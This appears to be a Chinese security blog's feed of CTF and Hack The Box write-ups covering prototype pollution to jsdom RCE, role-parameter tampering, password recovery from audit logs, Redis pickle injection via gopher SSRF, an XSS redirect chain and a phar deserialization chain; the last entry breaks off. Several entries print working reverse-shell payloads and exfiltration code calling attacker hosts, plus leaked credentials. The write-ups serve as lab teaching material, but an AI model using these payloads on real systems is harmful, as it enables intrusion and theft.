      <link href="2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/"/>
      <url>2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="XNUCA-2020-oooooooldjs题解-md"><a href="#XNUCA-2020-oooooooldjs题解-md" class="headerlink" title="XNUCA_2020_oooooooldjs题解.md"></a>XNUCA_2020_oooooooldjs题解.md</h1><p>文章首发于<a href="https://www.anquanke.com/post/id/221388" target="_blank" rel="noopener">安全客</a></p><p>题目描述</p><blockquote><p><code>npm audit</code> may miss something, be careful of the version of <code>lodash</code>. There is prototype pollution in <code>express-validator</code>, limited but powerful。</p></blockquote><p>npm audit发现lodash有原型链污染漏洞</p><pre><code># Run  npm update lodash --depth 2  to resolve 1 vulnerability  Low             Prototype Pollution                           Package         lodash                                        Dependency of   express-validator                             Path            express-validator &gt; lodash                    More info       https://npmjs.com/advisories/1523      </code></pre><p>在<a href="https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点" target="_blank" rel="noopener">https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点</a></p><p>传入json数据:<code>{&quot;233&quot;:123}</code>发现：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031215650.png" alt="image1151"></p><p>调用了存在原型链污染的set方法，且[233]不为object的键值，在这里可以触发原型链污染</p><p>一波测试后得到原型链污染的payload:<code>{&quot;.\&quot;].__proto__[\&quot;crossDomain&quot;:{&quot;1&quot;:&quot;2&quot;}}</code>，但是不能控制原型链污染的值</p><p>审计题目代码发现，非常有意思的两个地方</p><ol><li><p>显眼的dangerous<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220029.png" alt="image1432"></p></li><li><p>这里自己实现了数据库的CURD四种方法</p></li></ol><p>学习了一波后发现第一点可以触发RCE</p><pre><code class="javascript">const { JSDOM } = require(&quot;jsdom&quot;);new JSDOM(`&lt;body&gt;  &lt;script&gt;    const outerRealmFunctionConstructor = Node.constructor;    const process = new outerRealmFunctionConstructor(&quot;return process&quot;)();    const require = process.mainModule.require;    // Game over!    const fs = require(&#39;fs&#39;);    console.log(fs.readdirSync(&#39;.&#39;));  &lt;/script&gt;&lt;/body&gt;`, {   runScripts: &quot;dangerously&quot; });</code></pre><p>在util.js中定义了唯一会用到jsdom的函数</p><pre><code class="javascript">const {    JSDOM} = require(&quot;jsdom&quot;)const {    window} = new JSDOM(``, {    url: originUrl,    runScripts: &quot;dangerously&quot;})// server side `$` XDconst $ = require(&#39;jquery&#39;)(window)const requests = async (url, method) =&gt; {    let result = &quot;&quot;    try {        result = await $.ajax({            url: url,            type: method,        })        console.log(result)    } catch (err) {        console.log(err)        result = {            data: &quot;&quot;        }    }    return result.data}</code></pre><p>jquery的ajax有个特性是如果返回的content-type是text/javascript等代表着js脚本，那么便会执行js，结合上面的jsdom从而RCE，但是在低版本的话确实可以这么做，但是在高版本jquery进行了限制，如果是跨域请求便不会执行脚本</p><p>调试jquery代码发现：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220811.jpg" alt="image2617"></p><p>这里会覆盖我们的content-type，继续调试发现设置crossDomain的逻辑</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220938.png" alt="image2751"></p><p>如果s.crossDomain == null就会进入是否跨域的判断</p><p>利用前面的原型链污染从而绕过jquery的跨域限制</p><p>还剩下一个问题，我们如何传入自己的url</p><p>express开着一个中间件限制了我们url,而且也不让更新url类型的数据</p><pre><code class="javascript">const middlewares = [    // should be    body(&#39;*&#39;).trim(),    body(&#39;type&#39;).if(body(&#39;type&#39;).exists()).bail().isIn([&#39;url&#39;, &#39;text&#39;])    .withMessage(&quot;type must be `url` or `text`&quot;),    body(&#39;block&#39;).if(body(&#39;type&#39;).exists()).notEmpty()    .withMessage(&quot;no `block` content&quot;).bail()    .if(body(&#39;type&#39;).isIn([&#39;url&#39;])).isURL({        require_tld: false    })    .custom((value, {        req    }) =&gt; new URL(value).host === host)    .withMessage(&quot;invalid url!&quot;),    (req, res, next) =&gt; {        const errors = validationResult(req)        if (!errors.isEmpty()) {            return res.status(400).json({                errors: errors.array()            })        }        next()    }]</code></pre><p>回到我们刚刚说的第二点有趣的地方，这个简单的数据库并不支持事务功能，也就是说删除type和data并不会同时删除是存在一定的时间差的，相关代码如下</p><pre><code class="javascript">D(id) {        let di, dt        for (const index in this.datas) {            if (this.datas[index].id === id) {                dt = this.types[index]                this.types.splice(index, 1)                di = index            }        }        if (dt === &#39;url&#39;) {            requests(this.datas[di].block, &quot;DELETE&quot;).finally(()=&gt;{                this.datas = this.datas.filter((value)=&gt;value.id !== id)            })        } else {            this.datas = this.datas.filter((value)=&gt;value.id !== id)        }    }</code></pre><p>在删除了type后，他进行了一个相当耗时的操作：访问url，之后才删除data，又因为这里是一个链式删除，一个接着一个删除，所有type删除完后它可能才删除一个data</p><p>于是有：</p><pre><code class="python">import requestschallenge = &quot;http://eci-2ze1whgyeh7v30y5j8yh.cloudeci1.ichunqiu.com:8888&quot;def insertUrl(url):    burp0_url = challenge+&quot;/data&quot;    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}    burp0_data = {&quot;type&quot;: &quot;url&quot;, &quot;block&quot;: url}    result = {}    while True:        try:            result = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).json()        except Exception as e:            continue        return resultdef insertData(data):    burp0_url = challenge+&quot;/data&quot;    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}    burp0_data = {&quot;type&quot;: &quot;text&quot;, &quot;block&quot;: data}    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)    return r.json()def setLongLine(length=2000):    endId=&quot;&quot;    url = &quot;http://localhost:8888/data/fake-uuid&quot;    count = 0    while count &lt; length:        count+=1        data = insertUrl(url)        url = &quot;http://localhost:8888/data/&quot;+data[&quot;data&quot;][&quot;id&quot;]        endId = data[&quot;data&quot;][&quot;id&quot;]</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/11/13/XNUCA_2020_oooooooldjs题解/">https://www.ccreater.top/2020/11/13/XNUCA_2020_oooooooldjs题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Academy_write_up</title>
      <link href="2020/11/12/Academy_write_up/"/>
      <url>2020/11/12/Academy_write_up/</url>
      
        <content type="html"><![CDATA[<h1 id="Academy-Write-Up"><a href="#Academy-Write-Up" class="headerlink" title="Academy Write Up"></a>Academy Write Up</h1><p>目标：10.10.10.215</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://academy.htb/33060/tcp open  socks5?</code></pre><p>33060端口不知道是啥</p><h2 id="攻击http服务"><a href="#攻击http服务" class="headerlink" title="攻击http服务"></a>攻击http服务</h2><p>扫描目录得到</p><pre><code>[20:35:08] 200 -    3KB - /admin.php[20:36:10] 200 -    0B  - /config.php[20:37:09] 302 -   54KB - /home.php  -&gt;  login.php[20:37:21] 200 -    2KB - /index.php[20:37:40] 200 -    3KB - /login.php[20:38:32] 200 -    3KB - /register.php</code></pre><p>测试登入，注册接口的时候发现，</p><p>注册的POST请求是这样的：<code>uid=admin123&amp;password=admin123&amp;confirm=admin123&amp;roleid=0</code></p><p>有个roleid参数，将其改成1，注册admin账号</p><p>admin登入成功后，发现子域名</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112224004.png" alt="image811"></p><p>一进去网站就是报错状态，试着爆破路径，啥也没有</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201111213605.png" alt="image951"></p><p>msf搜索了一下laravel</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112224208.png" alt="image1077"></p><p>设置好参数试了一下就打通了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="www-data用户提升至cry0l1t3"><a href="#www-data用户提升至cry0l1t3" class="headerlink" title="www-data用户提升至cry0l1t3"></a>www-data用户提升至cry0l1t3</h3><p>翻了翻配置文件找到/var/www/html/academy/.env</p><pre><code>DB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=academyDB_USERNAME=devDB_PASSWORD=mySup3rP4s5w0rd!!</code></pre><p>这个密码诶个是过去发现是cry0l1t3的密码</p><h3 id="cry0l1t3移动到mrb3n"><a href="#cry0l1t3移动到mrb3n" class="headerlink" title="cry0l1t3移动到mrb3n"></a>cry0l1t3移动到mrb3n</h3><pre><code>iduid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)</code></pre><p>发现和syslog在同一个组下，我们可以查看任意日志了</p><p><code>cd /var/log/audit&amp;&amp;cat * | grep data=</code> 查看用户的输入</p><pre><code>type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=7375206D7262336E0Atype=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210Atype=TTY msg=audit(1597199304.778:89): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=77686F616D690Atype=TTY msg=audit(1597199308.262:90): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740Atype=TTY msg=audit(1597199317.622:93): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=2F62696E2F62617368202D690Atype=TTY msg=audit(1597199443.421:94): tty pid=2606 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790Dtype=TTY msg=audit(1597199533.458:95): tty pid=2643 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790Dtype=TTY msg=audit(1597199575.087:96): tty pid=2686 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=3618790Dtype=TTY msg=audit(1597199606.563:97): tty pid=2537 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;bash&quot; data=63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740Dtype=TTY msg=audit(1597199606.567:98): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740Atype=TTY msg=audit(1597199610.163:107): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=2F62696E2F62617368202D690Atype=TTY msg=audit(1597199616.307:108): tty pid=2712 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;bash&quot; data=6973746F72790D686973746F72790D657869740Dtype=TTY msg=audit(1597199616.307:109): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740A</code></pre><p>其中的<code>7375206D7262336E0A</code>=<code>su mrb3n</code>,<code>6D7262336E5F41634064336D79210A</code>=<code>mrb3n_Ac@d3my!</code></p><p>拿到mrb3n的密码</p><h3 id="mrb3n提权root"><a href="#mrb3n提权root" class="headerlink" title="mrb3n提权root"></a>mrb3n提权root</h3><p>sudo -l 看看自己能不能用sudo</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112225248.png" alt="image4850"></p><p>发现我们可以用sudo 执行composer</p><p>直接RCE</p><p>新建composer.json</p><pre><code>{    &quot;scripts&quot;: {        &quot;test&quot;: &quot;python3 -c \&quot;import base64; exec(base64.b64decode(&#39;aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0Ljk5Jyw1NTU1KSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=&#39;))\&quot;&quot;    }}</code></pre><p><code>sudo composer run-script --timeout=0 test</code></p><p>拿到root权限</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112225515.png" alt="image5511"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>一定要记得看自己能不能sudo</li><li>在adm组中通常可以查看任意日志</li><li>/var/log/audit存放着用户的输入，很有可能拿到密码</li></ol><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/11/12/Academy_write_up/">https://www.ccreater.top/2020/11/12/Academy_write_up/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020ByteCTF</title>
      <link href="2020/10/26/2020ByteCTF/"/>
      <url>2020/10/26/2020ByteCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="ByteCTF2020"><a href="#ByteCTF2020" class="headerlink" title="ByteCTF2020"></a>ByteCTF2020</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h3><p>体验一编网站的功能后，发现如下api</p><pre><code>/list/push post:url=https%3A%2F%2Fwww.4399.com&amp;code=16674458/result?url=https://www.4399.com</code></pre><p>让网站爬取自己的服务器以获得请求头</p><pre><code>GET / HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enUser-Agent: scrapy_redisAccept-Encoding: gzip, deflateHost: ccreater.top:60000</code></pre><p>通过ua头发现是：scrapy_redis</p><p>本地搭建scrapy_redis服务爬取网站，查看redis里设置的键值，发现myscrapy:requests中</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201026113031.png" alt="image528"></p><p>存在的pickle数据</p><p>网站自然提交http和https协议的url，但是因为是爬虫猜测嵌入一个a标签就可以绕过这个限制</p><p>提交如下网站</p><pre><code>&lt;a href=&quot;file:///etc/passwd&quot;&gt;</code></pre><p>成功读取到/etc/passwd，把爬虫代码爬下来本地测试</p><p>scrapy.cfg</p><pre><code class="python"># Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https://scrapyd.readthedocs.io/en/latest/deploy.html[settings]default = bytectf.settings[deploy]#url = http://localhost:6800/project = bytectf</code></pre><p>bytectf/settings.py</p><pre><code class="python">BOT_NAME = &#39;bytectf&#39;SPIDER_MODULES = [&#39;bytectf.spiders&#39;]NEWSPIDER_MODULE = &#39;bytectf.spiders&#39;RETRY_ENABLED = FalseROBOTSTXT_OBEY = FalseDOWNLOAD_TIMEOUT = 8USER_AGENT = &#39;scrapy_redis&#39;SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;REDIS_HOST = &#39;172.20.0.7&#39;REDIS_PORT = 6379ITEM_PIPELINES = {   &#39;bytectf.pipelines.BytectfPipeline&#39;: 300,}</code></pre><p>bytectf/byte.py</p><pre><code class="python">import scrapyimport reimport base64from scrapy_redis.spiders import RedisSpiderfrom bytectf.items import BytectfItemclass ByteSpider(RedisSpider):    name = &#39;byte&#39;    def parse(self, response):        byte_item = BytectfItem()        byte_item[&#39;byte_start&#39;] = response.request.url#ä¸»é®ï¼åå§url        url_list = []        test = response.xpath(&#39;//a/@href&#39;).getall()        for i in test:            if i[0] == &#39;/&#39;:                url = response.request.url + i            else:                url = i            if re.search(r&#39;://&#39;,url):                r = scrapy.Request(url,callback=self.parse2,dont_filter=True)                r.meta[&#39;item&#39;] = byte_item                yield r                url_list.append(url)                if(len(url_list)&gt;3):                    break        byte_item[&#39;byte_url&#39;] = response.request.url        byte_item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))        yield byte_item    def parse2(self,response):        item = response.meta[&#39;item&#39;]        item[&#39;byte_url&#39;] = response.request.url        item[&#39;byte_text&#39;] = base64.b64encode((response.text).encode(&#39;utf-8&#39;))        yield item</code></pre><p>bytectf/items.py</p><pre><code class="python">import scrapyclass BytectfItem(scrapy.Item):    # define the fields for your item here like:    # name = scrapy.Field()    byte_start = scrapy.Field()#    byte_text = scrapy.Field()#text</code></pre><p>bytectf/pipelines.py</p><pre><code class="python">import pymongoclass BytectfPipeline:    def __init__:        MONGODB_HOST = &#39;172.20.0.8&#39;        MONGODB_PORT = 27017        MONGODB_DBNAME = &#39;result&#39;        MONGODB_TABLE = &#39;result&#39;        MONGODB_USER = &#39;N0rth3&#39;        MONGODB_PASSWD = &#39;E7B70D0456DAD39E22735E0AC64A69AD&#39;        mongo_client = pymongo.MongoClient(&quot;%s:%d&quot; % (MONGODB_HOST, MONGODB_PORT))        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)        mongo_db = mongo_client[MONGODB_DBNAME]        self.table = mongo_db[MONGODB_TABLE]    def process_item(self, item, spider):        quote_info = dict(item)        print(quote_info)        self.table.insert(quote_info)        return item</code></pre><p>测试<code>&lt;a href=&quot;gopher://.....&quot;&gt;</code>发现并不能解析gopher协议</p><p>继续测试发现接口<code>/result?url=https://www.4399.com</code>，也存在ssrf漏洞且至此gopher协议</p><p>传入以下payload:</p><pre><code>gopher%3a//172.20.0.7%3a6379/_%250D%250Azadd%2520byte%253Arequests%25201%2520%2522cos%255Cnsystem%255Cn%2528S%2527python%2520-c%2520%255Cx27import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253Bs.connect%2528%2528%255Cx2239.108.164.219%255Cx22%252C60003%2529%2529%253Bos.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253Bp%253Dsubprocess.call%2528%255B%255Cx22/bin/sh%255Cx22%252C%255Cx22-i%255Cx22%255D%2529%253B%255Cx27%2527%255CntR.%2522%250D%250Aquit%250D%250A</code></pre><p>成功弹回shell</p><h3 id="douyin-vedio"><a href="#douyin-vedio" class="headerlink" title="douyin_vedio"></a>douyin_vedio</h3><p>题目描述</p><blockquote><p>Do you like douyin video?<br>Submit your payload at <a href="http://c.bytectf.live:30002/" target="_blank" rel="noopener">http://c.bytectf.live:30002/</a></p><p>( Server URLs which only admin can access:<br><a href="http://a.bytectf.live:30001/" target="_blank" rel="noopener">http://a.bytectf.live:30001/</a><br><a href="http://b.bytectf.live:30001/" target="_blank" rel="noopener">http://b.bytectf.live:30001/</a> )</p></blockquote><p>题目中只能将<a href="http://a.bytectf.live:30001/" target="_blank" rel="noopener">http://a.bytectf.live:30001/</a> 开头的url发给管理员，而c.bytectf.live中存在未过滤的xss点</p><p>思路就很清晰了，想办法跳转到c.bytectf.live再说，我们查看源代码发现：</p><pre><code>RewriteRule /favicon.ico$ /favicon.ico [QSA,PT,L]RewriteRule /$ / [QSA,PT,L]RewriteRule /search$ /search [QSA,PT,L]RewriteRule /send$ /send [QSA,PT,L]RewriteRule /static/(.*)$ /static/$1 [QSA,PT,L]RewriteRule (.*)$ http://www.douyin.com$1  </code></pre><p>最后一个神奇的重写规则，所以我们只要在<a href="http://www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss" target="_blank" rel="noopener">www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss</a></p><p>通常url跳转常出现在登入登出，还有外站url跳转，顺着这个思路我们可以找到<code>http://www.douyin.com/logout/?next=https%3A%2F%2Fwww.douyin.com/23333</code>可以跳转到部分域名(<a href="http://www.douyin.com" target="_blank" rel="noopener">www.douyin.com</a> , creator.douyin.com …)</p><p>这样就扩大了我们的攻击面，继续按照相同的思路进一步扩大攻击面的url:<code>https://creator.douyin.com/passport/web/logout/?next=https://www.douyin.com</code></p><p>测试发现可以跳转到任意<code>douyin.com/bytedance.com/.bytecdn.cn/ixigua.com/bytedance.net/snssdk.com/toutiao.com/huoshan.com/jinritemai.com</code>结尾的域名</p><p>接着用谷歌搜索：<code>site:xxxxxxx.com 跳转</code> 发现任意url跳转:<code>https://tsearch-quic.snssdk.com/search/jump?url=http://ccreater.top:60080</code></p><p>组合成跳转到c.bytectf.live的url:</p><pre><code>http://a.bytectf.live:30001/logout?next=https%3a//creator.douyin.com/passport/web/logout/%3fnext%3dhttps://tsearch-quic.snssdk.com/search/jump?url=http://c.bytectf.live:30002/?action=post%25252526id=b44cb32f302e2d4249dea06a2ffa0da1</code></pre><p>因为安全策略的设置问题(<code>frame-ancestors http://*.bytectf.live:*/</code>覆盖了<code>[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;</code>)，导致我们可以直接作为iframe导入，读取内容</p><pre><code>    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;    resp.headers[&#39;Content-Security-Policy&#39;] = &quot;default-src http://*.bytectf.live:*/ &#39;unsafe-inline&#39;; frame-src *; frame-ancestors http://*.bytectf.live:*/&quot;    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;</code></pre><p>所以xss的代码是：</p><pre><code class="javascript">document.domain=&quot;bytectf.live&quot;; flagPage=document.createElement(&quot;iframe&quot;); flagPage.src=&quot;http://a.bytectf.live:30001/?keyword=B&quot;; document.body.append(flagPage); setTimeout(()=&gt;{ document.location=&quot;http://ccreater.top:60001/&quot;+btoa(document.body.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.document.body.innerHTML) },500)</code></pre><p>但是不知道为啥iframe.src=<code>http://a.bytectf.live:30001/</code>可以获取到内容，而<code>http://a.bytectf.live:30001/send</code>却不可以。。。</p><p>监听端口成功拿到flag</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/26/2020ByteCTF/">https://www.ccreater.top/2020/10/26/2020ByteCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客2020wp</title>
      <link href="2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/"/>
      <url>2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/</url>
      
        <content type="html"><![CDATA[<h1 id="巅峰极客2020"><a href="#巅峰极客2020" class="headerlink" title="巅峰极客2020"></a>巅峰极客2020</h1><p><strong>文章首发于<a href="https://www.anquanke.com/post/id/218977" target="_blank" rel="noopener">安全客</a></strong></p><h2 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h2><p>文件包含：<a href="http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login" target="_blank" rel="noopener">http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login</a><br>登入接口ban掉：</p><pre><code>`,\,@,%,#</code></pre><pre><code>[11:00:52] 200 -   68B  - /index.php[11:00:53] 200 -   68B  - /index.php/login/[11:01:33] 200 -  583B  - /login.php[11:03:57] 403 -  335B  - /server-status[11:04:19] 403 -  336B  - /server-status/[11:05:21] 200 -  422B  - /upload.php[11:05:22] 403 -  329B  - /upload/[11:05:41] 301 -  383B  - /upload  -&gt;  http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/upload/[11:06:20] 200 -    4KB - /www.zip</code></pre><p>构造反序列化链：<code>dbCtrl::__destruct-&gt;User::__toString-&gt;Reader::__set</code></p><pre><code class="php">&lt;?phpClass Reader{    public $filename;    public $result;    public function __construct(){    }}class User{    public $id;    public $age=null;    public $nickname=null;    public $backup;    public function __construct(){        $this-&gt;backup=&quot;/flag&quot;;        $this-&gt;nickname=new Reader();    }}class dbCtrl{    public $hostname=&quot;127.0.0.1&quot;;    public $dbuser=&quot;p3rh4ps&quot;;    public $dbpass=&quot;p3rh4ps&quot;;    public $database=&quot;p3rh4ps&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct(){        $this-&gt;token=new User();    }}$a = new dbCtrl();@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar,phar伪协议不用phar后缀$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub,只要后面部分为__HALT_COMPILER(); $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();</code></pre><p><code>compress.zlib://phar://phar.phar/test.txt绕过限制</code></p><h2 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h2><p>php:5.6.40</p><p>robots.txt</p><pre><code>User-agent: *Disallow: /admin</code></pre><pre><code>[12:31:50] 200 -   38B  - /admin/[12:31:50] 200 -   38B  